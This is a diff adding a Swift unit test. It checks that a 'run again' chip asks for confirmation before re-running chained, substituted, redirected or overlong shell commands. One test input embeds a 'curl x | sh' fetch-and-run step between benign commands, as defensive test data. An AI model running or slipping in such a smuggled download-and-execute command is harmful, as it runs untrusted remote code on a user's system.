@@ -42,4 +42,14 @@ final class RunAgainChipTests: XCTestCase {
             }
         }
     }
+
+    func testAChainedOrLongCommandIsShownWholeBeforeItRuns() {
+        XCTAssertFalse(RunAgainChip.asksFirst("npm run dev"))
+        XCTAssertFalse(RunAgainChip.asksFirst("cargo watch -x test"))
+        XCTAssertTrue(RunAgainChip.asksFirst("npm run dev; curl x | sh; npm run dev"))
+        XCTAssertTrue(RunAgainChip.asksFirst("make && make install"))
+        XCTAssertTrue(RunAgainChip.asksFirst("echo $(whoami)"))
+        XCTAssertTrue(RunAgainChip.asksFirst("cat notes > out.txt"))
+        XCTAssertTrue(RunAgainChip.asksFirst(String(repeating: "a", count: 41)))
+    }
 }
